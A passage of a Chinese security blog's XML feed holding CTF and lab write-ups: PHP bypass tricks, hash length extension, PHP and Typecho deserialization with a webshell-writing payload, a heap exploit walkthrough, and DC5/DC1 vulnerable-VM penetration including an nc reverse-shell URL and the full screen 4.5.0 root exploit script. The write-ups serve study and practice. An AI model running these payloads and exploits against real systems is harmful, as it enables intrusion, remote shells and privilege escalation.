0, 1), &quot;1114&quot;) 结合后面的substr($b, 0, 1)!=4 要通过substr函数的截断才行 所以设置$b=%00111111, substr函数会被截断，strlen不会，eregi就能匹配上了。 补充一点php伪协议的知识，参考了LoRexxar师傅的文章。 php中支持的伪协议很多， 123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 我们最常用的任意文件读取的payload就是用了php://协议： 1php://filter/read=convert.base64-encode/resource=upload.php 针对php://filter，官方文档是这样写的： 12345名称 描述resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 在我们的payload中，upload.php就是要过滤的数据流，convert.base64-encode就是要读链的筛选列表 之所以要base64编码，一般是为了数据传输的方便 官方文档中能够举了如下栗子： 123456789101112131415161718&lt;?php$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode');fwrite($fp, "This is a test.\n");fclose($fp);$param = array('line-length'=&gt;8, 'line-break-chars'=&gt;"\r\n");$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-encode', STREAM_FILTER_WRITE, $param);fwrite($fp, "This is a test.\n");fclose($fp);$fp = fopen('php://output', 'w');stream_filter_append($fp, 'convert.base64-decode');fwrite($fp, "VGhpcyBpcyBhIHRlc3QuCg==");fclose($fp);?&gt; 除了base64之外还有其他的一些过滤器，官方文档中有些。 challenge-11 1234567891011121314151617181920212223242526272829&lt;?php error_reporting(0);$link = mysql_connect('localhost', 'root', '');if (!$link) &#123; die('Could not connect to MySQL: ' . mysql_error()); &#125; // 选择数据库$db = mysql_select_db("test", $link);if(!$db)&#123; echo 'select db error'; exit();&#125;// 执行sql$password = $_GET['pwd'];$sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";var_dump($sql);$result=mysql_query($sql) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt; challenge-12 123456&lt;?php error_reporting(0);show_source(__FILE__);$a = @$_REQUEST['hello'];eval("var_dump($a);"); 字符串直接拼接 ?hello=);eval(phpinfo());// challenge-13 1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['foo']);if(is_array($a))&#123; is_numeric(@$a["bar1"])?die("nope"):NULL; if(@$a["bar1"])&#123; ($a["bar1"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a["bar2"]))&#123; if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope"); $pos = array_search("nudt", $a["a2"]); $pos===false?die("nope"):NULL; foreach($a["bar2"] as $key=&gt;$val)&#123; $val==="nudt"?die("nope"):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi("3|1|c",$d.$c[0])?die("nope"):NULL; strpos(($c[0].$d), "htctf2016")?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include "flag.php"; echo $flag;&#125;?&gt; 可能是我对json不是很了解，这里必须都使用双引号才行。 两个不是弱类型的trick： 12var_dump(0===false) 为falsevar_dump(null===false) 为false]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[哈希扩展攻击继续分析]]></title>
    <url>%2F2019%2F08%2F12%2F%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%BB%A7%E7%BB%AD%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[最近看到了好多针对de1ctf ssrfme题目分析，顺便把之前没搞明白的哈希长度扩展攻击写一下 链接这篇文章讲的很仔细了，分析一下文章中的栗子 师傅给的代码 md5的过程 MD5 padding 如果输入信息的长度(字节)对64求余的结果不等于56，就需要填充使得对64求余的结果等于56。填充的方法是填充一个x80和xx个0。填充完后，信息的长度为N*64+56(字节)，并且最后8个字节用来记录原始输入信息长度 MD5 compress 这个算法直接到网上找就行 所以MD5的过程就是： 先进行消息长度的填充(padding)。填充完后，初始化的4个Magic number会和第一个64字节的Message block进行md5 compress压缩算法。压缩算法完成后，会产生新的4个Magic number。这样再进行第二个64字节Message block的md5 compress压缩算法。以此类推……直到压缩到最后64个字节的(Message block + padding)，最后得到的Magic number经过hex转化就是最后的md5 hash值 比如md5('admin'),由于padding之后只有64个字节，所以只进行一轮的md5 compress 得到的密文就是： 21232f297a57a5a743894a0e4a801fc3 我们可以从密文推导出4个magic number： 1234A=0x292f2321LB=0xa7a5577aLC=0xe4a8943LD=0xc31f804aL 这个关系就是大小端转化一下 md5长度扩展的攻击过程 知道如下三个值： md5(salt+message)的值 message内容 salt+message长度 我们可以根据md5(salt+message)的值逆向出最后的四个magic number 12345def compute_magic_number(self, md5str): self.A = struct.unpack("I", md5str[0:8].decode('hex'))[0] self.B = struct.unpack("I", md5str[8:16].decode('hex'))[0] self.C = struct.unpack("I", md5str[16:24].decode('hex'))[0] self.D = struct.unpack("I", md5str[24:32].decode('hex'))[0] 这个四个magic number去和m做一下次的md5 compress 再理解一下 继续又看了一篇师傅的文章，想要好好梳理一下哈希扩展攻击 师傅是以sha1算法为例讲解的： sha1的流程如下： sha1算法和md5很相似，也有最初的四个IV，并且是确定的(这是一种很不好的方法但是也是一种无奈的举动) 一个不足64位的字符串会被padding至64位，并且由于只有一个分组，所以只需要一轮运算即可 我们在前一次64位padding之后的字符串的基础上加入一些字符，sha1(salt+padding+add_data) 首先这里肯定是要分成两组的，前一组加密后的内容已经知道了，同时产生的新的IV会参与下一次的复杂的数学运算 而这些IV是能够从第一组的密文中得知的，这就导致下一组加密后的内容实际上我们也可以知道的 《白帽子讲web安全》上提到，如何利用长度扩展攻击： LengthExtension 使得可以在原文之后附加任意的值，并计算出新的hash值，最常见的地方就是签名 错误的签名校验算法 参数连接时没有使用分隔符，本来是?a=1&amp;b=2&amp;c=3在签名算法中简单地变成了a1b2c3 于是攻击者可以伪造参数?a=1b2c3[...padding....]&amp;b=4&amp;c=5 最终在签名算法中连接时变成了a1b2c3[...padding...]b4c5 附加任意的参数 HPP 最简单的防护就是将secret放置在参数的末尾 举例 大师傅给的栗子： 1234567891011121314151617181920&lt;?php$role = $_REQUEST["role"];$hash = $_REQUEST["hash"];$salt = "meme"; if ($hash !== md5($salt.$role))&#123; echo 'wrong!'; exit;&#125;if ( $role == 'admin')&#123; echo 'wrong, hash cann\'t be admin'; exit;&#125;echo "You are ".$role.'&lt;/br&gt;';echo 'Congradulation!';?&gt; 已知role为admin，salt的长度为4，hash值为：c7813629f22b6a7d28a08041db3e80a9 我们可以在role后面附加任意的数据使得第一个if被绕过 用大师傅的脚本： python md5pad.py c7813629f22b6a7d28a08041db3e80a9 joychou 9 当然也可以这样： 1234567$ hashpump Input Signature: c7813629f22b6a7d28a08041db3e80a9Input Data: adminInput Key Length: 9Input Data to Add: joychou06cf5a94dcda53659f58c0f411ba0bd8admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00joychou 注意第三次输入的数据长度是包括salt在内的 参考 深入理解hash长度扩展攻击（sha1为例） Hash Length Extension Attack]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php反序列化笔记1]]></title>
    <url>%2F2019%2F08%2F11%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[在freebuf上看到了一篇新的php反序列化的文章，借此继续分析一下php反序列化。 文章中的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace("/[&lt;&gt;*;|?\n ]/","",$str); $str=str_replace('flag','',$str); return $str; &#125; function echos($host)&#123; system("echos $host".$host); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array("echos"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first='hi';$var='var';$bbb='bbb';$ccc='ccc';$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first==="doller")&#123; var_dump($_GET['a']); @parse_str($_GET['a']); if($var==="give") &#123; if($bbb==="me") &#123; if($ccc==="flag") &#123; echo"&lt;br&gt;welcome!&lt;br&gt;"; $come=@$_POST['come']; unserialize($come); &#125; &#125; else &#123;echo "&lt;br&gt;think about it&lt;br&gt;";&#125; &#125; else &#123; echo "NO"; &#125;&#125;else&#123; echo "Can you hack me?&lt;br&gt;";&#125;?&gt; 有两个小trick需要绕过，都是变量覆盖的漏洞，同时parse_str函数需要接受的是一个字符串，为了在浏览器栏中输入需要将&amp;符号进行URL编码 http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag 这样就能绕过两个小trick 之后就是怎么利用那个反序列化了，__construct函数没有什么用，__wakeup方法会将私有属性args通过一个waf函数进行过滤，__destruct函数中有一个危险函数call_user_func_array,注意到调用这个函数的时候传入的是一个数组，其实就是调用这个this类中的一个方法。但是之前的if判断限制了调用的方法只能是echos，分析echos方法发现其中有一个system函数，但是echo错误的拼成了echos 😆 于是我们的思路就是通过传入反序列化后的值使得echos函数被调用执行我们的命令，这就设计到在Linux或者Windows中一行执行多条命令的方式。 在Linux中： &amp;是不管前后命令是否执行成功都会执行前后命令 &amp;&amp;是前面的命令执行成功才能执行后面的命令 ||是前面的命令执行不成功才能执行后面的命令 |管道符 构造出反序列化数据如下： O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;&amp;dir&quot;;}s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;} 但是。。。 var_dump一下发现了： :\ProgramFiles\phpstudy\PHPTutorial\WWW\test\unserialize.php:104:string 'O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;' (length=44) 发现数据被截断了。。 var_dump之前的构造的反序列化数据： 12O:4:&quot;come&quot;:2:&#123;s:10:&quot;comeargs&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;&#125;F:\notes\audit\test.php:8: ---&gt; echo出来的结果string(86) &quot;O:4:&quot;come&quot;:2:&#123;s:10:&quot;\000come\000args&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;\000come\000method&quot;;s:5:&quot;echos&quot;;&#125;&quot; ---&gt; var_dump出来的结果 因为php在反序列化数据时： protected属性的表示方式是在变量名前加个%00*%00 private表示方式是在变量名前加上%00类名%00 所以次数的两个private属性都被加上了00阶段符号，于是只能通过python手动编码传输数据了 12345678910import requestsurl = "http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag"n = '00'.decode('hex')o = 'O:4:"come":2:&#123;s:12:"'+n+'come'+n+'method";s:5:"echos";s:10:"'+n+'come'+n+'args";a:1:&#123;i:0;s:4:"&amp;dir";&#125;&#125;"'r = requests.post(url, data=&#123;"come":o&#125;)print r.text 返回的结果如下： 之后如果要读取flag还有几个姿势，但不是本文的重点了 typecho反序列化漏洞 先放出payload 12345678910111213141516171819202122&lt;?php class Typecho_Request&#123; private $_filter=array("assert"); private $_params=array("screenName"=&gt;"file_put_contents('jrxnm.php', '&lt;?php eval(\$_GET[jrxnm]);');"); &#125; class Typecho_Feed&#123; private $_items = array(); private $_type = 'RSS 2.0'; function __construct()&#123; $item['author'] = new Typecho_Request(); $this-&gt;_items[0] = $item; &#125; &#125; $abc = new Typecho_Feed();echo base64_encode(serialize(array("adapter"=&gt;$abc,"prefix"=&gt;"_typecho"))); 序列化一个数组之后作为cookie传入，关键代码： 此处$config接收cookie中的参数，那么$config此时就是一个数组: $config = array(&quot;adapter&quot;=&gt;$abc, &quot;prefix&quot;=&gt;&quot;_typecho&quot;) 其中adapter键对应的是一个对象。 然后$config的两个键值对应的value都作为参数进入了一个类。 查看该类的构造方法发现存在字符串拼接： 那么查找__toString()魔术方法，我们发现在Feed.php文件中的一个类：Typecho_Feed $item['author']-&gt;screenName如果$item['author'] 是一个对象，且不存在screenName属性时，会自动调用__get魔法函数。 于是我们想要在实例化Typecho_Db类的时候，调用Typecho_Feed类中的__toString方法 此时继续寻找__get方法： 在Request.php文件中有一个类Typecho_Request中的__get方法如下： 1234567891011/** * 获取实际传递参数(magic) * * @access public * @param string $key 指定参数 * @return void */public function __get($key)&#123; return $this-&gt;get($key);&#125; 继续分析get方法： 12345678910111213141516171819202122232425public function get($key, $default = NULL)&#123; $value = $default; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset($_GET[$key]): $value = $_GET[$key]; break; case isset($_POST[$key]): $value = $_POST[$key]; break; case isset($_COOKIE[$key]): $value = $_COOKIE[$key]; break; default: $value = $default; break; &#125; $value = is_array($value) || strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_filter ? $this-&gt;_applyFilter($value) : $value;&#125; 如果$this-&gt;_filter，就会调用_applyFilter方法： 123456789101112private function _applyFilter($value)&#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; &#125; $this-&gt;_filter = array(); return $value;&#125; 此时终于看到了call_user_func方法，函数名是this-&gt;_filter 再看一道反序列化 ``php &lt;?php class Template{ public $cacheFile = '/tmp/cachefile'; public $template = '&lt;div&gt;welcome back %s &lt;/div&gt;'; public function __construct($data=null) { $data=$this-&gt;lodaData($data); $this-&gt;render($data); } public function loadData($data){ if(substr($data, 0, 2) !== '0:' &amp;&amp; !preg_match('/0:\d:\/', $data)){ return unserialize($data); } return []; } public function createCache($file=null, $tpl=null){ $file = $file ?? $this-&gt;cacheFile; $tpl = $tpl ?? $this-&gt;template; file_put_contents($file, $tpl); } public function render($data){ echo sprintf($this-&gt;template, htmlspecialchars($data['name'])); } public function __destruct() { $this-&gt;createCache(); } } new Template($_COOKIE['data']); 123456789101112这道题也是反序列化的应用，利用思路很清晰就是通过`__destruct`调用`createCache`写入一个webshell重点在于这里：```php public function loadData($data)&#123; if(substr($data, 0, 2) !== &apos;0:&apos; &amp;&amp; !preg_match(&apos;/0:\d:\/&apos;, $data))&#123; return unserialize($data); &#125; return []; &#125; 如果绕过这个if判断，这里需要分析一下php的源码：在'O:',后面可以增加'+'，用来绕过正则判断。 参考 PHP反序列化漏洞简介及相关技巧小结]]></content>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctfbabyheap]]></title>
    <url>%2F2019%2F08%2F10%2F0ctfbabyheap%2F</url>
    <content type="text"><![CDATA[被0ctf的这道题目搞了好久。记录一下 思路是使用fastbin attack，how2heap上有一个栗子可以分析一下 先申请5个chunk，free之后使得 fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULL 12345678allocate(0x10) # idx 0, 0x00allocate(0x10) # idx 1, 0x20allocate(0x10) # idx 2, 0x40allocate(0x10) # idx 3, 0x60allocate(0x80) # idx 4, 0x80# free idx 1, 2, fastbin[0]-&gt;idx1-&gt;idx2-&gt;NULLfree(2)free(1) 此时的bins 12345678910pwndbg&gt; binsfastbins0x20: 0x5619d93ea020 —▸ 0x5619d93ea040 ◂— 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbin 1234567891011121314151617181920pwndbg&gt; x/40gx 0x5619d93ea0000x5619d93ea000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x5619d93ea010: 0x0000000000000000 0x00000000000000000x5619d93ea020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x5619d93ea030: 0x00005619d93ea040 0x00000000000000000x5619d93ea040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x5619d93ea050: 0x0000000000000000 0x00000000000000000x5619d93ea060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x5619d93ea070: 0x0000000000000000 0x00000000000000000x5619d93ea080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x5619d93ea090: 0x0000000000000000 0x00000000000000000x5619d93ea0a0: 0x0000000000000000 0x00000000000000000x5619d93ea0b0: 0x0000000000000000 0x00000000000000000x5619d93ea0c0: 0x0000000000000000 0x00000000000000000x5619d93ea0d0: 0x0000000000000000 0x00000000000000000x5619d93ea0e0: 0x0000000000000000 0x00000000000000000x5619d93ea0f0: 0x0000000000000000 0x00000000000000000x5619d93ea100: 0x0000000000000000 0x00000000000000000x5619d93ea110: 0x0000000000000000 0x0000000000020ef10x5619d93ea120: 0x0000000000000000 0x0000000000000000 然后我们修改idx2的指针,通过fill idx0造成溢出，同时由于内存对齐，可以肯定idx4的指针最后肯定是0x80 修改后如下： 1234567891011pwndbg&gt; x/40gx 0x560e5e91c0000x560e5e91c000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x560e5e91c010: 0x6161616161616161 0x61616161616161610x560e5e91c020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x560e5e91c030: 0x0000560e5e91c080 0x0000000000000000 0x560e5e91c040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x560e5e91c050: 0x0000000000000000 0x00000000000000000x560e5e91c060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x560e5e91c070: 0x0000000000000000 0x00000000000000000x560e5e91c080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x560e5e91c090: 0x0000000000000000 0x0000000000000000 此时的bins指向： 123456pwndbg&gt; binsfastbins0x20: 0x560e5e91c020 —▸ 0x560e5e91c080 ◂— 0x0 (idx2--&gt;idx4)0x30: 0x00x40: 0x00x50: 0x0 如果再连续申请两个chunk，那么第一次是idx2，第二次就是idx4 但是malloc有一个check机制，如果两个fastbin的大小不一样就会报错，所以我们再借用一下idx3，让其溢出到idx4，修改idx4的大小 1234567891011pwndbg&gt; x/40gx 0x5573e66cd000 0x5573e66cd000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x5573e66cd010: 0x6161616161616161 0x6161616161616161 0x5573e66cd020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x5573e66cd030: 0x00005573e66cd080 0x00000000000000000x5573e66cd040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x5573e66cd050: 0x0000000000000000 0x00000000000000000x5573e66cd060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x5573e66cd070: 0x6161616161616161 0x61616161616161610x5573e66cd080: 0x0000000000000000 0x0000000000000021 ---&gt;idx40x5573e66cd090: 0x0000000000000000 0x0000000000000000 此时idx4的大小已经被修改了，于是可以申请了 12allocate(0x10) # idx 1allocate(0x10) # idx 2, which point to idx4's location 之后，如果我们想要将 idx 4 放到 unsorted bin 中的话，先需要把它的大小改回来，同时为了防止其与 top chunk 合并，我们需要再次申请一个 chunk。此后再释放 idx4 就会进入 unsorted bin 中去了。 1234567891011121314pwndbg&gt; x/40gx 0x559b5b9a50000x559b5b9a5000: 0x0000000000000000 0x0000000000000021 ---&gt;idx00x559b5b9a5010: 0x6161616161616161 0x6161616161616161 0x559b5b9a5020: 0x0000000000000000 0x0000000000000021 ---&gt;idx10x559b5b9a5030: 0x0000000000000000 0x00000000000000000x559b5b9a5040: 0x0000000000000000 0x0000000000000021 ---&gt;idx20x559b5b9a5050: 0x0000000000000000 0x00000000000000000x559b5b9a5060: 0x0000000000000000 0x0000000000000021 ---&gt;idx30x559b5b9a5070: 0x6161616161616161 0x61616161616161610x559b5b9a5080: 0x0000000000000000 0x0000000000000091 ---&gt;idx40x559b5b9a5090: 0x00007fa9e254eb78 0x00007fa9e254eb780x559b5b9a50a0: 0x0000000000000000 0x00000000000000000x559b5b9a50b0: 0x0000000000000000 0x00000000000000000x559b5b9a50c0: 0x0000000000000000 0x0000000000000000 此时dump(2)就可以得到unsorted bin 的地址了。 此时的bins如下 123456789101112pwndbg&gt; binsfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x559b5b9a5080 —▸ 0x7fa9e254eb78 (main_arena+88) ◂— 0x559b5b9a5080smallbins]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>onegadget</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DC靶机渗透]]></title>
    <url>%2F2019%2F08%2F09%2FDC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[DC 5 扫描ip地址 之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了 123456789101112# root @ kali in ~ [4:06:38] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.166 00:0c:29:d7:ef:a4 VMware, Inc.192.168.41.167 00:0c:29:fd:e8:73 VMware, Inc. ---&gt; DC5靶机192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc.5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded 扫描端口 masscan扫出了几个端口： 12345678910# root @ kali in ~ [4:09:46] $ masscan -p0-65535 192.168.41.167 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 80/tcp on 192.168.41.167 Discovered open port 111/tcp on 192.168.41.167 Discovered open port 33188/tcp on 192.168.41.167 扫描端口对应的服务 然后上nmap扫服务 12345678910111213141516# root @ kali in ~ [4:10:42] $ nmap -p80,111,33188 -sV -T4 192.168.41.167Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDTStats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)Nmap scan report for 192.168.41.167Host is up (0.00042s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.6.2111/tcp open rpcbind 2-4 (RPC #100000)33188/tcp open status 1 (RPC #100024)MAC Address: 00:0C:29:FD:E8:73 (VMware)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds 访问原始网页： 扫描后台——推荐使用 gobuster dirsearch.py似乎没有发现什么 123456Target: http://192.168.41.167 [16:24:35] Starting:[16:24:35] 400 - 172B - /%2e%2e/google.com[16:24:42] 301 - 184B - /css -&gt; http://192.168.41.167/css/[16:24:44] 301 - 184B - /images -&gt; http://192.168.41.167/images/[16:24:44] 200 - 4KB - /index.php 看了师傅们的提示，发现footer.php很有趣 每次刷新数字都会变化 同时发现在 http://192.168.41.167/thankyou.php页面也有这种效果，于是猜想是不是本地文件包含漏洞 访问http://192.168.41.167/thankyou.php?file=/etc/passwd，页面回显了！ 同时该主机使用的是nginx服务，于是可以写一个shell到日志中并且包含这个文件 写入webshell，注意这里使用的是passthru函数 同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。 kali监听一个端口然后访问如下路由去包含文件并且弹shell http://192.168.41.167/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc%20192.168.41.165%202333%20-c%20/bin/bash 核心命令nc 192.168.41.165 -c /bin/bash 此时的权限是www-data 接下来看如何提权 上提权辅助脚本 链接 发现有这个文件 exploit-db上搜一下exp： 123456789101112131415161718192021222324252627282930313233343536373839404142#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo "~ gnu/screenroot ~"echo "[+] First, we create our shell and library..."cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123; chown("/tmp/rootshell", 0, 0); chmod("/tmp/rootshell", 04755); unlink("/etc/ld.so.preload"); printf("[+] done!\n");&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123; setuid(0); setgid(0); seteuid(0); setegid(0); execvp("/bin/sh", NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho "[+] Now we create our /etc/ld.so.preload file..."cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # newline neededecho "[+] Triggering..."screen -ls # screen itself is setuid, so... /tmp/rootshell 提权方法 exploit 地址 下载下来之后直接运行是不太可能的，我们需要将其中的C语言文件单独编译 然后修改原有的sh脚本 1234567891011121314151617#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017) echo "~ gnu/screenroot ~"echo "[+] First, we create our shell and library..."echo "[+] Now we create our /etc/ld.so.preload file..."cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # newline neededecho "[+] Triggering..."screen -ls # screen itself is setuid, so... /tmp/rootshell 但是我不知道怎么将文件上传到靶机中，尝试过使用python开启一个服务器然后用wget命令还是失败了 如图发现还是失败了 （纠结在不知道如何将文件传过去。tcl DC5后记 thankyou.php文件中有以下内容；典型的本地文件包含漏洞 12345678910111213141516&lt;div class="footer-wrapper"&gt; &lt;footer&gt; &lt;?php $file = $_GET['file']; if(isset($file)) &#123; include("$file"); &#125; else &#123; include("footer.php"); &#125; ?&gt; &lt;/footer&gt; DC1 arp-scan发现主机 12345678# root @ kali in ~ [9:46:49] $ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.168 00:0c:29:9f:4c:60 VMware, Inc. ---&gt; DC1靶机192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc. 扫描端口 1234567891011# root @ kali in ~ [9:46:56] $ masscan -p0-65535 192.168.41.168 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 13:47:23 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 111/tcp on 192.168.41.168 Discovered open port 47738/tcp on 192.168.41.168 Discovered open port 22/tcp on 192.168.41.168 Discovered open port 80/tcp on 192.168.41.168 发现80端口是一个cms，名字叫drupal metasploit搜索一下drupal的渗透模块 123456789101112msf5 &gt; search drupalMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 1 auxiliary/gather/drupal_openid_xxe 2012-10-17 normal Yes Drupal OpenID External Entity Injection 2 auxiliary/scanner/http/drupal_views_user_enum 2010-07-02 normal Yes Drupal Views Module Users Enumeration 3 exploit/multi/http/drupal_drupageddon 2014-10-15 excellent No Drupal HTTP Parameter Key/Value SQL Injection 4 exploit/unix/webapp/drupal_coder_exec 2016-07-13 excellent Yes Drupal CODER Module Remote Command Execution 5 exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection 然后设置相关参数，获得shell 123456789101112131415161718msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOSTS 192.168.41.168RHOSTS =&gt; 192.168.41.168msf5 